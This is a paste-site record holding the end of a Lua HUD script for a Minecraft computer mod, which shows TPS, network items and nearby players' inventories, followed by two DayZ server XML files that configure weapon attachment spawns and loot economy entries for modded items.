    end
end

function getPlayersNearME()
    local temp = peripherals.sensor.getPlayers()
    local playersCount = #temp
    for g = 1, #temp do
        for j = 1, #players do
            if players[j].name == temp[g].name and players[j].isHideOnline then
                playersCount = playersCount - 1
            end
        end
    end
    if playersCount > 0 then
        drawSlot(constraints.leftBorderAbsolute, absoluteYIndex, constraints.players_near_title_width, defaultSlotValue, localize.near_ME, colors.players_near_title_color)
        absoluteYIndex = absoluteYIndex + defaultSlotValue
    end
    if settings.player_items then
        for i = 1, #temp do
            local isShowPlayer = true
            for j = 1, #players do
                if players[j].name == temp[i].name and players[j].isHideOnline then
                    isShowPlayer = false
                    break
                end
            end
            if isShowPlayer then
                drawPlayerDetails(constraints.leftBorderAbsolute, absoluteYIndex, temp[i].name, defaultSlotValue)
                absoluteYIndex = absoluteYIndex + defaultSlotValue
            end
        end
    end
end

function drawPlayerDetails(startX, startY, playerName, slotSize)
    local inventory = peripherals.sensor.getPlayerByName(playerName).all().player.inventory
    drawSlot(startX, startY, constraints.nickname_width, slotSize, playerName, colors.player_near_nickname_color)
    local slotAreaX = startX + constraints.nickname_width - slotSize--todo
    local slotAreaY = startY
    for i = 1, 9 do
        local slotX = slotAreaX + (i * slotSize)
        local slotY = slotAreaY
        drawSlot(slotX, slotY, slotSize, slotSize)
        local inventorySlotLink = inventory[i]
        if inventorySlotLink then
            local inventorySlot = inventorySlotLink.all()
            addIcon(slotX + 1, slotY + 1 , inventorySlot.id, inventorySlot.dmg)
            if inventorySlot.qty and inventorySlot.qty > 1 then
                if inventorySlot.qty > 9 then
                    addText(slotX + slotSize/2 - 3, slotY + slotSize/2 + 1, string.format(""%u"", inventorySlot.qty), colors.white)
                else
                    addText(slotX + slotSize/2 + 3, slotY + slotSize/2 + 1, string.format(""%u"", inventorySlot.qty), colors.white)
                end
            end
            if inventorySlot.electric then
                if inventorySlot.electric.charge then
                    local gapX = 2
                    local gapBottom = 3
                    local barWidth = slotSize - gapX * 2
                    local chargePercent = inventorySlot.electric.charge / inventorySlot.electric.maxCharge
                    local chargeWidth = barWidth * chargePercent
                    addBox(slotX + gapX, slotY + slotSize - gapBottom, barWidth, 1, colors.not_charge_level_color, 1)
                    addBox(slotX + gapX, slotY + slotSize - gapBottom, chargeWidth, 1, colors.charge_level_color, 1)
                end
            end
            if inventorySlot.energy_te then
                if inventorySlot.energy_te.energyStored < inventorySlot.energy_te.maxEnergyStored then
                    local gapX = 2
                    local gapBottom = 3
                    local barWidth = slotSize - gapX * 2
                    local chargePercent = inventorySlot.energy_te.energyStored / inventorySlot.energy_te.maxEnergyStored
                    local chargeWidth = barWidth * chargePercent
                    addBox(slotX + gapX, slotY + slotSize - gapBottom, barWidth, 1, colors.not_charge_level_color, 1)
                    addBox(slotX + gapX, slotY + slotSize - gapBottom, chargeWidth, 1, colors.charge_level_color, 1)
                end
            end
        end
    end
end

function getCurrentTPS()
    realTimeOld = time()
    os.sleep(timeConstant)
    realTimeNew = time()
    realTimeDiff = realTimeNew-realTimeOld
    TPS[tSlot] = 20000*timeConstant/realTimeDiff
    avgTPS = (TPS[1]+TPS[2]+TPS[3]+TPS[4]+TPS[5]+TPS[6]+TPS[7]+TPS[8]+TPS[9]+TPS[10])/10
    drawSlot(constraints.leftBorderAbsolute, absoluteYIndex, constraints.tpsTextWith, defaultSlotValue, localize.tps, colors.tps_title_color)
    drawSlot(constraints.leftBorderAbsolute + constraints.tpsTextWith, absoluteYIndex, constraints.tpsValueWidth, defaultSlotValue, string.format(""%.2f"",TPS[tSlot]), colors.tps_value_color)
    absoluteYIndex = absoluteYIndex + defaultSlotValue
    drawSlot(constraints.leftBorderAbsolute, absoluteYIndex, constraints.tpsTextWith, defaultSlotValue, localize.avg_tps, colors.tps_title_color)
    drawSlot(constraints.leftBorderAbsolute + constraints.tpsTextWith, absoluteYIndex, constraints.tpsValueWidth, defaultSlotValue, string.format(""%.2f"",avgTPS), colors.tps_value_color)
    absoluteYIndex = absoluteYIndex + defaultSlotValue
    if tSlot == 10 then
        tSlot = 0
    end
    tSlot = tSlot + 1
end

gui()

while true do
    absoluteYIndex = constraints.topBorderAbsolute
    check()
    computer.addUser(settings.admin)
    peripherals.bridge.clear()
    setTime() --время вверху
    if settings.memory_monitoring then
        getFreeMemory()
    end
    if settings.tps then
        getCurrentTPS()
    end
    if settings.me_items then
        local network = peripherals.me_interface.getItemsInNetwork()
        addMEInfo(network)
        network = nil
    end
    if settings.sensor_players then
        mem1 = computer.freeMemory()
        getPlayersNearME()

    end
    drawOnline() --онлайн игроки
    peripherals.bridge.sync()
    os.sleep(timeConstant)
end
"
pNysfq5d,cfgspawnabletypes_BAT,battlestar255,XML,Tuesday 2nd of January 2024 07:35:39 PM CDT,"<?xml version=""1.0"" encoding=""UTF-8"" standalone=""yes"" ?>

<spawnabletypes>
	<type name=""Bat_Adar15"">
		<attachments chance=""0.20"">
			<item name=""M68Optic"" chance=""0.20"" />
			<item name=""ReflexOptic"" chance=""0.20"" />
		</attachments>
		<attachments chance=""0.00""> <!-- DISABLED DUE THE GAME BUG -->
			<item name=""Mag_STANAG_30Rnd"" chance=""0.30"" />
			<item name=""Mag_CMAG_30Rnd"" chance=""0.30"" />			
		</attachments>
	</type>
	<type name=""Bat_R700"">

		<attachments chance=""0.20"">
			<item name=""HuntingOptic"" chance=""0.20"" />
		</attachments>
	</type>		
	<type name=""Bat_FDE_FNX45"">
		<attachments chance=""0.00""> <!-- DISABLED DUE THE GAME BUG -->
			<item name=""Mag_FNX45_15Rnd"" chance=""1.00"" />
		</attachments>
		<attachments chance=""0.05"">
			<item name=""PistolSuppressor"" chance=""1.00"" />
		</attachments>
		<attachments chance=""0.10"">
			<item name=""TLRLight"" chance=""1.00"" />
		</attachments>
	</type>		
	<type name=""Bat_FDE_Glock19"">
		<attachments chance=""0.00""> <!-- DISABLED DUE THE GAME BUG -->
			<item name=""Mag_Glock_15Rnd"" chance=""1.00"" />
		</attachments>
		<attachments chance=""0.05"">
			<item name=""PistolSuppressor"" chance=""1.00"" />
		</attachments>
	</type>	
	<type name=""Bat_MakarovIJ70"">
		<attachments chance=""0.00""> <!-- DISABLED DUE THE GAME BUG -->
			<item name=""Mag_IJ70_8Rnd"" chance=""1.00"" />
		</attachments>
		<attachments chance=""0.05"">
			<item name=""PistolSuppressor"" chance=""1.00"" />
		</attachments>
	</type>
	<type name=""Bat_M76"">
		<subcounter min=""30"" max=""60"" />
        <attachments chance=""0.10"">
            <item name=""Bat_Mag_M76_10Rnd"" chance=""1.00"" />
        </attachments>
		<!-- PSO1Optic KashtanOptic  -->
    </type>
    <type name=""BAT_IFAK"">
        <tag name=""shelves"" />
        <cargo chance=""1"">
            <item name=""Bat_Splint"" />
        </cargo>
        <cargo chance=""1"">
            <item name=""BloodTestKit"" />
        </cargo>
        <cargo chance=""1"">
            <item name=""Morphine"" />
        </cargo>
        <cargo chance=""1"">
            <item name=""SalineBagIV"" />
        </cargo>
    </type>
	<type name=""Bat_SV98"">
		<attachments chance=""0.10"">
            <item name=""HuntingOptic"" chance=""1.00"" />
        </attachments>
		<attachments chance=""0.30"">
            <item name=""AK_Suppressor"" chance=""0.50"" />
        </attachments>
	</type>	
    <type name=""Bat_SVD_Wood"">
		<subcounter min=""30"" max=""60"" />
        <attachments chance=""0.10"">
            <item name=""Mag_SVD_10Rnd"" chance=""1.00"" />
        </attachments>
		<!-- PSO1Optic KashtanOptic  -->
    </type>		
	<type name=""Bat_MP433"">
		<subcounter min=""30"" max=""60"" />
        <attachments chance=""0.10"">
            <item name=""Bat_Grach_mag_18Rnd"" chance=""1.00"" />
        </attachments>
		<!-- PSO1Optic KashtanOptic  -->
    </type>
	<type name=""Bat_VeprH"">
		<subcounter min=""30"" max=""60"" />
        <attachments chance=""0.10"">
            <item name=""Bat_Veprh_mag_5Rnd"" chance=""1.00"" />
        </attachments>
		<!-- PSO1Optic KashtanOptic  -->
    </type>
	<type name=""Bat_AEK_971"">
		<subcounter min=""30"" max=""60"" />
        <attachments chance=""0.10"">
            <item name=""Mag_AK74_30Rnd"" chance=""1.00"" />
        </attachments>
		<!-- PSO1Optic KashtanOptic  -->
    </type>
	<type name=""Bat_ACR"">
		<subcounter min=""30"" max=""60"" />
        <attachments chance=""0.10"">
            <item name=""Bat_Mag_CMAG_30Rnd"" chance=""1.00"" />
        </attachments>
		<!-- PSO1Optic KashtanOptic  -->
    </type>	
	<type name=""Bat_HoneyBadger"">
		<subcounter min=""30"" max=""60"" />
        <attachments chance=""0.10"">
            <item name=""Bat_Mag_CMAG_30Rnd"" chance=""1.00"" />
        </attachments>
		<!-- PSO1Optic KashtanOptic  -->
    </type>	
	<type name=""Bat_ServiceRifle"">
		<subcounter min=""30"" max=""60"" />
        <attachments chance=""0.10"">
            <item name=""Mag_STANAG_30Rnd"" chance=""1.00"" />
        </attachments>
		<!-- PSO1Optic KashtanOptic  -->
    </type>		
</spawnabletypes>"
h55dfzmX,TYPES_BAT,battlestar255,XML,Tuesday 2nd of January 2024 07:34:49 PM CDT,"<?xml version=""1.0"" encoding=""UTF-8"" standalone=""yes""?>
<types>
	<type name=""Bat_R700"">
        <nominal>2</nominal>
        <lifetime>7200</lifetime>
        <restock>1800</restock>
        <min>2</min>
        <quantmin>-1</quantmin>
        <quantmax>-1</quantmax>
        <cost>100</cost>
        <flags count_in_cargo=""0"" count_in_hoarder=""0"" count_in_map=""1"" count_in_player=""0"" crafted=""0"" deloot=""0""/>
        <category name=""weapons""/>
		<usage name=""Military""/>
        <value name=""Tier4""/>
	</type>
    <type name=""BAT_ADAR15"">
        <nominal>2</nominal>
        <lifetime>7200</lifetime>
        <restock>1800</restock>
        <min>2</min>
        <quantmin>-1</quantmin>
        <quantmax>-1</quantmax>
        <cost>100</cost>
        <flags count_in_cargo=""0"" count_in_hoarder=""0"" count_in_map=""1"" count_in_player=""0"" crafted=""0"" deloot=""0""/>
        <category name=""weapons""/>
		<usage name=""Military""/>
        <value name=""Tier3""/>
        <value name=""Tier4""/>
    </type>
    <type name=""Bat_Model158"">
        <nominal>10</nominal>
        <lifetime>10800</lifetime>
        <restock>1800</restock>
        <min>7</min>
        <quantmin>-1</quantmin>
        <quantmax>-1</quantmax>
        <cost>100</cost>
        <flags count_in_cargo=""0"" count_in_hoarder=""0"" count_in_map=""1"" count_in_player=""0"" crafted=""0"" deloot=""0""/>
        <category name=""weapons""/>
        <value name=""Tier2""/>
    </type>
	<type name=""Bat_MakarovIJ70"">
        <nominal>50</nominal>
        <lifetime>10800</lifetime>
        <restock>0</restock>
        <min>30</min>
        <quantmin>-1</quantmin>
        <quantmax>-1</quantmax>
        <cost>100</cost>
        <flags count_in_cargo=""0"" count_in_hoarder=""0"" count_in_map=""1"" count_in_player=""0"" crafted=""0"" deloot=""0""/>
        <category name=""weapons""/>
        <tag name=""shelves""/>
        <usage name=""Village""/>
    </type>
    <type name=""Bat_FDE_Glock19"">
        <nominal>25</nominal>
        <lifetime>7200</lifetime>
        <restock>0</restock>
        <min>18</min>
        <quantmin>-1</quantmin>
        <quantmax>-1</quantmax>
        <cost>100</cost>
        <flags count_in_cargo=""0"" count_in_hoarder=""0"" count_in_map=""1"" count_in_player=""0"" crafted=""0"" deloot=""0""/>
        <category name=""weapons""/>
        <tag name=""shelves""/>
        <usage name=""Police""/>
    </type>
    <type name=""Bat_FDE_FNX45"">
        <nominal>10</nominal>
        <lifetime>10800</lifetime>
        <restock>1800</restock>
        <min>5</min>
        <quantmin>-1</quantmin>
        <quantmax>-1</quantmax>
        <cost>100</cost>
        <flags count_in_cargo=""0"" count_in_hoarder=""0"" count_in_map=""1"" count_in_player=""0"" crafted=""0"" deloot=""0""/>
        <category name=""weapons""/>
        <usage name=""Military""/>
        <value name=""Tier1""/>
        <value name=""Tier2""/>
    </type>
    <type name=""Bat_Mp133Shotgun"">
        <nominal>15</nominal>
        <lifetime>10800</lifetime>
        <restock>0</restock>
        <min>10</min>
        <quantmin>-1</quantmin>
        <quantmax>-1</quantmax>
        <cost>100</cost>
        <flags count_in_cargo=""0"" count_in_hoarder=""0"" count_in_map=""1"" count_in_player=""0"" crafted=""0"" deloot=""0""/>
        <category name=""weapons""/>
        <usage name=""Police""/>
    </type>
	<type name=""Bat_HunterPants_Black"">
        <nominal>5</nominal>
        <lifetime>5600</lifetime>
        <restock>0</restock>
        <min>2</min>
        <quantmin>-1</quantmin>
        <quantmax>-1</quantmax>
        <cost>100</cost>
        <flags count_in_cargo=""0"" count_in_hoarder=""0"" count_in_map=""1"" count_in_player=""0"" crafted=""0"" deloot=""0""/>
        <category name=""clothes""/>
        <usage name=""Hunting""/>
        <value name=""Tier2""/>
        <value name=""Tier3""/>
    </type>
	<type name=""Bat_HuntingJacket_Black"">
        <nominal>8</nominal>
        <lifetime>5600</lifetime>
        <restock>0</restock>
        <min>3</min>
        <quantmin>-1</quantmin>
        <quantmax>-1</quantmax>
        <cost>100</cost>
        <flags count_in_cargo=""0"" count_in_hoarder=""0"" count_in_map=""1"" count_in_player=""0"" crafted=""0"" deloot=""0""/>
        <category name=""clothes""/>
        <usage name=""Hunting""/>
        <value name=""Tier3""/>
    </type>
    <type name=""RidersJacket_Black"">
        <nominal>8</nominal>
        <lifetime>5600</lifetime>
        <restock>0</restock>
        <min>3</min>
        <quantmin>-1</quantmin>
        <quantmax>-1</quantmax>
        <cost>100</cost>
        <flags count_in_cargo=""0"" count_in_hoarder=""0"" count_in_map=""1"" count_in_player=""0"" crafted=""0"" deloot=""0""/>
        <category name=""clothes""/>
        <usage name=""Town""/>
    </type>
	<type name=""Bat_GorkaEJacket_BrownFlat"">
        <nominal>8</nominal>
        <lifetime>5600</lifetime>
        <restock>600</restock>
        <min>3</min>
        <quantmin>-1</quantmin>
        <quantmax>-1</quantmax>
        <cost>100</cost>
        <flags count_in_cargo=""0"" count_in_hoarder=""0"" count_in_map=""1"" count_in_player=""0"" crafted=""0"" deloot=""0""/>
        <category name=""clothes""/>
        <usage name=""Military""/>
    </type>
    <type name=""Bat_GorkaPants_BrownFlat"">
        <nominal>8</nominal>
        <lifetime>5600</lifetime>
        <restock>600</restock>
        <min>3</min>
        <quantmin>-1</quantmin>
        <quantmax>-1</quantmax>
        <cost>100</cost>
        <flags count_in_cargo=""0"" count_in_hoarder=""0"" count_in_map=""1"" count_in_player=""0"" crafted=""0"" deloot=""0""/>
        <category name=""clothes""/>
        <usage name=""Military""/>
    </type>
	<type name=""Bat_Vests_PlateCarrier_Black"">
        <nominal>1</nominal>
        <lifetime>2700</lifetime>
        <restock>0</restock>
        <min>1</min>
        <quantmin>-1</quantmin>
        <quantmax>-1</quantmax>
        <cost>50</cost>
        <flags count_in_cargo=""0"" count_in_hoarder=""0"" count_in_map=""1"" count_in_player=""0"" crafted=""0"" deloot=""0""/>
        <category name=""clothes""/>
        <usage name=""Military""/>
		<value name=""Tier3""/>
        <value name=""Tier4""/>
    </type>
	<type name=""Bat_Vests_PlateCarrierPouches_Black"">
        <nominal>10</nominal>
        <lifetime>7200</lifetime>
        <restock>0</restock>
        <min>5</min>
        <quantmin>-1</quantmin>
        <quantmax>-1</quantmax>
        <cost>100</cost>
        <flags count_in_cargo=""0"" count_in_hoarder=""0"" count_in_map=""1"" count_in_player=""0"" crafted=""0"" deloot=""0""/>
        <category name=""clothes""/>
        <tag name=""shelves""/>
        <usage name=""Military""/>
    </type>
	<type name=""Bat_MilitaryGear_PlateCarrierHolster_Black"">
        <nominal>10</nominal>
        <lifetime>7200</lifetime>
        <restock>0</restock>
        <min>5</min>
        <quantmin>-1</quantmin>
        <quantmax>-1</quantmax>
        <cost>100</cost>
        <flags count_in_cargo=""0"" count_in_hoarder=""0"" count_in_map=""1"" count_in_player=""0"" crafted=""0"" deloot=""0""/>
        <category name=""clothes""/>
        <tag name=""shelves""/>
        <usage name=""Military""/>
    </type>
	<type name=""Bat_Vests_PlateCarrier_Green"">
        <nominal>1</nominal>
        <lifetime>2700</lifetime>
        <restock>0</restock>
        <min>1</min>
        <quantmin>-1</quantmin>
        <quantmax>-1</quantmax>
        <cost>50</cost>
        <flags count_in_cargo=""0"" count_in_hoarder=""0"" count_in_map=""1"" count_in_player=""0"" crafted=""0"" deloot=""0""/>
        <category name=""clothes""/>
        <usage name=""Military""/>
		<value name=""Tier3""/>
        <value name=""Tier4""/>
    </type>
	<type name=""Bat_Vests_PlateCarrierPouches_Green"">
        <nominal>10</nominal>
        <lifetime>7200</lifetime>
        <restock>0</restock>
        <min>5</min>
        <quantmin>-1</quantmin>
        <quantmax>-1</quantmax>
        <cost>100</cost>
        <flags count_in_cargo=""0"" count_in_hoarder=""0"" count_in_map=""1"" count_in_player=""0"" crafted=""0"" deloot=""0""/>
        <category name=""clothes""/>
        <tag name=""shelves""/>
        <usage name=""Military""/>
    </type>
	<type name=""Bat_MilitaryGear_PlateCarrierHolster_Green"">
        <nominal>10</nominal>
        <lifetime>7200</lifetime>
        <restock>0</restock>
        <min>5</min>
        <quantmin>-1</quantmin>
        <quantmax>-1</quantmax>
        <cost>100</cost>
        <flags count_in_cargo=""0"" count_in_hoarder=""0"" count_in_map=""1"" count_in_player=""0"" crafted=""0"" deloot=""0""/>
        <category name=""clothes""/>
        <tag name=""shelves""/>
        <usage name=""Military""/>
    </type>
    <type name=""Bat_MilitaryGear_Policevest_Black"">
        <nominal>10</nominal>
        <lifetime>5600</lifetime>
        <restock>0</restock>
        <min>5</min>
        <quantmin>-1</quantmin>
        <quantmax>-1</quantmax>
        <cost>100</cost>
        <flags count_in_cargo=""0"" count_in_hoarder=""0"" count_in_map=""1"" count_in_player=""0"" crafted=""0"" deloot=""0""/>
        <category name=""clothes""/>
        <usage name=""Police""/>
    </type>
	<type name=""BAT_IFAK"">
        <nominal>8</nominal>
        <lifetime>7200</lifetime>
        <restock>0</restock>
        <min>10</min>
        <quantmin>-1</quantmin>
        <quantmax>-1</quantmax>
        <cost>100</cost>
        <flags count_in_cargo=""0"" count_in_hoarder=""0"" count_in_map=""1"" count_in_player=""0"" crafted=""0"" deloot=""0""/>
        <category name=""Shelves""/>
        <usage name=""Medic""/>
    </type>
	<type name=""Bat_AmmoBox_8mm_15rnd"">
        <nominal>120</nominal>
        <lifetime>7200</lifetime>
        <restock>0</restock>
        <min>80</min>
        <quantmin>-1</quantmin>
        <quantmax>-1</quantmax>
        <cost>100</cost>
        <flags count_in_cargo=""0"" count_in_hoarder=""0"" count_in_map=""1"" count_in_player=""0"" crafted=""0"" deloot=""0""/>
        <category name=""weapons""/>
        <usage name=""Military""/>
        <usage name=""Police""/>
        <usage name=""Town""/>
        <usage name=""Village""/>
        <usage name=""Hunting""/>
    </type>
    <type name=""Bat_SVD_Wood"">
        <nominal>5</nominal>
        <lifetime>7200</lifetime>
        <restock>14400</restock>
        <min>0</min>
        <quantmin>-1</quantmin>
        <quantmax>-1</quantmax>
        <cost>100</cost>
        <flags count_in_cargo=""1"" count_in_hoarder=""1"" count_in_map=""1"" count_in_player=""1"" crafted=""0"" deloot=""1""/>
        <category name=""weapons""/>
        <usage name=""Military""/>
        <value name=""Tier3""/>
        <value name=""Tier4""/>
    </type>
    <type name=""Bat_M76"">
        <nominal>5</nominal>
        <lifetime>7200</lifetime>
        <restock>14400</restock>
        <min>0</min>
        <quantmin>-1</quantmin>
        <quantmax>-1</quantmax>
        <cost>100</cost>
        <flags count_in_cargo=""1"" count_in_hoarder=""1"" count_in_map=""1"" count_in_player=""1"" crafted=""0"" deloot=""1""/>
        <category name=""weapons""/>
        <usage name=""Military""/>
        <value name=""Tier3""/>
        <value name=""Tier4""/>
    </type>
    <type name=""Bat_Mag_M76_10Rnd"">
        <nominal>15</nominal>
        <lifetime>7200</lifetime>
        <restock>1800</restock>
        <min>8</min>
        <quantmin>20</quantmin>
        <quantmax>90</quantmax>
        <cost>0</cost>
        <flags count_in_cargo=""0"" count_in_hoarder=""0"" count_in_map=""1"" count_in_player=""0"" crafted=""0"" deloot=""0""/>
        <category name=""weapons""/>
        <usage name=""Military""/>
    </type>
    <type name=""Bat_sv98"">
        <nominal>40</nominal>
        <lifetime>10800</lifetime>
        <restock>1800</restock>
        <min>30</min>
        <quantmin>-1</quantmin>
        <quantmax>-1</quantmax>
        <cost>100</cost>
        <flags count_in_cargo=""1"" count_in_hoarder=""1"" count_in_map=""1"" count_in_player=""0"" crafted=""0"" deloot=""0""/>
        <category name=""weapons""/>
        <usage name=""Military""/>
        <value name=""Tier3""/>
        <value name=""Tier4""/>
    <type name=""Bat_Mag_SV98_10Rnd"">
        <nominal>15</nominal>
        <lifetime>7200</lifetime>
        <restock>1800</restock>
        <min>8</min>
        <quantmin>20</quantmin>
        <quantmax>90</quantmax>
        <cost>0</cost>
        <flags count_in_cargo=""0"" count_in_hoarder=""0"" count_in_map=""1"" count_in_player=""0"" crafted=""0"" deloot=""0""/>
        <category name=""weapons""/>
        <usage name=""Military""/>
    </type>
	<type name=""Bat_GorkaEJacket_Flora"">
        <nominal>8</nominal>
        <lifetime>5600</lifetime>
        <restock>600</restock>
        <min>3</min>
        <quantmin>-1</quantmin>
        <quantmax>-1</quantmax>
        <cost>100</cost>
        <flags count_in_cargo=""0"" count_in_hoarder=""0"" count_in_map=""1"" count_in_player=""0"" crafted=""0"" deloot=""0""/>
        <category name=""clothes""/>
        <usage name=""Military""/>
    </type>
    <type name=""Bat_GorkaPants_Flora"">
        <nominal>8</nominal>
        <lifetime>5600</lifetime>
        <restock>600</restock>
        <min>3</min>
        <quantmin>-1</quantmin>
        <quantmax>-1</quantmax>
        <cost>100</cost>
        <flags count_in_cargo=""0"" count_in_hoarder=""0"" count_in_map=""1"" count_in_player=""0"" crafted=""0"" deloot=""0""/>
        <category name=""clothes""/>
        <usage name=""Military""/>
    </type>
    <type name=""Bat_Rem223"">
        <nominal>10</nominal>
        <lifetime>10800</lifetime>
        <restock>1800</restock>
        <min>7</min>
        <quantmin>-1</quantmin>
        <quantmax>-1</quantmax>
        <cost>100</cost>
        <flags count_in_cargo=""0"" count_in_hoarder=""0"" count_in_map=""1"" count_in_player=""0"" crafted=""0"" deloot=""0""/>
        <category name=""weapons""/>
        <value name=""Tier2""/>
    </type>
	    <type name=""Bat_DenimJacket_Green"">
        <nominal>8</nominal>
        <lifetime>5600</lifetime>
        <restock>0</restock>
        <min>3</min>
        <quantmin>-1</quantmin>
        <quantmax>-1</quantmax>
        <cost>100</cost>
        <flags count_in_cargo=""0"" count_in_hoarder=""0"" count_in_map=""1"" count_in_player=""0"" crafted=""0"" deloot=""0""/>
        <category name=""clothes""/>
        <usage name=""Town""/>
    </type>
	</type>
	<type name=""Bat_DenimJacket_Black"">
        <nominal>8</nominal>
        <lifetime>5600</lifetime>
        <restock>0</restock>
        <min>3</min>
        <quantmin>-1</quantmin>
        <quantmax>-1</quantmax>
        <cost>100</cost>
        <flags count_in_cargo=""0"" count_in_hoarder=""0"" count_in_map=""1"" count_in_player=""0"" crafted=""0"" deloot=""0""/>
        <category name=""clothes""/>
        <usage name=""Town""/>
    </type>
    <type name=""Bat_HikingJacket_Wheat"">
        <nominal>10</nominal>
        <lifetime>5600</lifetime>
        <restock>0</restock>
        <min>5</min>
        <quantmin>-1</quantmin>
        <quantmax>-1</quantmax>
        <cost>100</cost>
        <flags count_in_cargo=""0"" count_in_hoarder=""0"" count_in_map=""1"" count_in_player=""0"" crafted=""0"" deloot=""0""/>
        <category name=""clothes""/>
        <usage name=""Village""/>
    </type>
	<type name=""Bat_HikingJacket_Papillon"">
        <nominal>10</nominal>
        <lifetime>5600</lifetime>
        <restock>0</restock>
        <min>5</min>
        <quantmin>-1</quantmin>
        <quantmax>-1</quantmax>
        <cost>100</cost>
        <flags count_in_cargo=""0"" count_in_hoarder=""0"" count_in_map=""1"" count_in_player=""0"" crafted=""0"" deloot=""0""/>
        <category name=""clothes""/>
        <usage name=""Village""/>
    </type>
	<type name=""Bat_HikingJacket_Nortex"">
        <nominal>10</nominal>
        <lifetime>5600</lifetime>
        <restock>0</restock>
        <min>5</min>
        <quantmin>-1</quantmin>
        <quantmax>-1</quantmax>
        <cost>100</cost>
        <flags count_in_cargo=""0"" count_in_hoarder=""0"" count_in_map=""1"" count_in_player=""0"" crafted=""0"" deloot=""0""/>
        <category name=""clothes""/>
        <usage name=""Village""/>
    </type>
	<type name=""Bat_BoonieHat_Flora"">
        <nominal>10</nominal>
        <lifetime>5600</lifetime>
        <restock>0</restock>
        <min>5</min>
        <quantmin>-1</quantmin>
        <quantmax>-1</quantmax>
        <cost>100</cost>
        <flags count_in_cargo=""0"" count_in_hoarder=""0"" count_in_map=""1"" count_in_player=""0"" crafted=""0"" deloot=""0""/>
        <category name=""clothes""/>
        <usage name=""Village""/>
    </type>
	<type name=""Bat_BaseballCap_Fire"">
        <nominal>10</nominal>
        <lifetime>5600</lifetime>
        <restock>0</restock>
        <min>5</min>
        <quantmin>-1</quantmin>
        <quantmax>-1</quantmax>
        <cost>100</cost>
        <flags count_in_cargo=""0"" count_in_hoarder=""0"" count_in_map=""1"" count_in_player=""0"" crafted=""0"" deloot=""0""/>
        <category name=""clothes""/>
        <usage name=""Village""/>
    </type>
	<type name=""Bat_BaseballCap_USA"">
        <nominal>10</nominal>
        <lifetime>5600</lifetime>
        <restock>0</restock>
        <min>5</min>
        <quantmin>-1</quantmin>
        <quantmax>-1</quantmax>
        <cost>100</cost>
        <flags count_in_cargo=""0"" count_in_hoarder=""0"" count_in_map=""1"" count_in_player=""0"" crafted=""0"" deloot=""0""/>
        <category name=""clothes""/>
        <usage name=""Village""/>
    </type>
	<type name=""Bat_Splint"">
        <nominal>0</nominal>
        <lifetime>3</lifetime>
        <restock>0</restock>
        <min>0</min>
        <quantmin>-1</quantmin>
        <quantmax>-1</quantmax>
        <cost>100</cost>
        <flags count_in_cargo=""0"" count_in_hoarder=""0"" count_in_map=""0"" count_in_player=""0"" crafted=""0"" deloot=""0""/>
        <category name=""tools""/>
        <usage name=""Medic""/>
    </type>
	<type name=""BAT_BERKUT_Green"">
        <nominal>8</nominal>
        <lifetime>5600</lifetime>
        <restock>600</restock>
        <min>3</min>
        <quantmin>-1</quantmin>
        <quantmax>-1</quantmax>
        <cost>100</cost>
        <flags count_in_cargo=""0"" count_in_hoarder=""0"" count_in_map=""1"" count_in_player=""0"" crafted=""0"" deloot=""0""/>
        <category name=""clothes""/>
        <usage name=""Military""/>
    </type>
	<type name=""BAT_BERKUT_Flectarn"">
        <nominal>8</nominal>
        <lifetime>5600</lifetime>
        <restock>600</restock>
        <min>3</min>
        <quantmin>-1</quantmin>
        <quantmax>-1</quantmax>
        <cost>100</cost>
        <flags count_in_cargo=""0"" count_in_hoarder=""0"" count_in_map=""1"" count_in_player=""0"" crafted=""0"" deloot=""0""/>
        <category name=""clothes""/>
        <usage name=""Military""/>
    </type>
	<type name=""BAT_BERKUT_Flectarn"">
        <nominal>8</nominal>
        <lifetime>5600</lifetime>
        <restock>600</restock>
        <min>3</min>
        <quantmin>-1</quantmin>
        <quantmax>-1</quantmax>
        <cost>100</cost>
        <flags count_in_cargo=""0"" count_in_hoarder=""0"" count_in_map=""1"" count_in_player=""0"" crafted=""0"" deloot=""0""/>
        <category name=""clothes""/>
        <usage name=""Military""/>
    </type>
	<type name=""Bat_BERKUT_Tan"">
        <nominal>0</nominal>
        <lifetime>3</lifetime>
        <restock>0</restock>
        <min>0</min>
        <quantmin>-1</quantmin>
        <quantmax>-1</quantmax>
        <cost>100</cost>
        <flags count_in_cargo=""0"" count_in_hoarder=""0"" count_in_map=""0"" count_in_player=""0"" crafted=""0"" deloot=""0""/>
        <category name=""tools""/>
        <usage name=""Medic""/>
    </type>
	<type name=""Bat_BERKUT_Black"">
        <nominal>0</nominal>
        <lifetime>3</lifetime>
        <restock>0</restock>
        <min>0</min>
        <quantmin>-1</quantmin>
        <quantmax>-1</quantmax>
        <cost>100</cost>
        <flags count_in_cargo=""0"" count_in_hoarder=""0"" count_in_map=""0"" count_in_player=""0"" crafted=""0"" deloot=""0""/>
        <category name=""tools""/>
        <usage name=""Medic""/>
    </type>
	<type name=""BAT_SlingBag_Tan"">
        <nominal>50</nominal>
        <lifetime>28800</lifetime>
        <restock>0</restock>
        <min>30</min>
        <quantmin>-1</quantmin>
        <quantmax>-1</quantmax>
        <cost>100</cost>
        <flags count_in_cargo=""0"" count_in_hoarder=""0"" count_in_map=""1"" count_in_player=""0"" crafted=""0"" deloot=""0""/>
        <category name=""containers""/>
        <usage name=""Town""/>
        <usage name=""Village""/>
        <usage name=""School""/>
    </type>
	<type name=""BAT_SlingBag_Black"">
        <nominal>50</nominal>
        <lifetime>28800</lifetime>
        <restock>0</restock>
        <min>30</min>
        <quantmin>-1</quantmin>
        <quantmax>-1</quantmax>
        <cost>100</cost>
        <flags count_in_cargo=""0"" count_in_hoarder=""0"" count_in_map=""1"" count_in_player=""0"" crafted=""0"" deloot=""0""/>
        <category name=""containers""/>
        <usage name=""Town""/>
        <usage name=""Village""/>
        <usage name=""School""/>
    </type>
	<type name=""BAT_SlingBag_Maroon"">
        <nominal>50</nominal>
        <lifetime>28800</lifetime>
        <restock>0</restock>
        <min>30</min>
        <quantmin>-1</quantmin>
        <quantmax>-1</quantmax>
        <cost>100</cost>
        <flags count_in_cargo=""0"" count_in_hoarder=""0"" count_in_map=""1"" count_in_player=""0"" crafted=""0"" deloot=""0""/>
        <category name=""containers""/>
        <usage name=""Town""/>
        <usage name=""Village""/>
        <usage name=""School""/>
    </type>
	<type name=""BAT_SlingBag_Navy"">
        <nominal>50</nominal>
        <lifetime>28800</lifetime>
        <restock>0</restock>
        <min>30</min>
        <quantmin>-1</quantmin>
        <quantmax>-1</quantmax>
        <cost>100</cost>
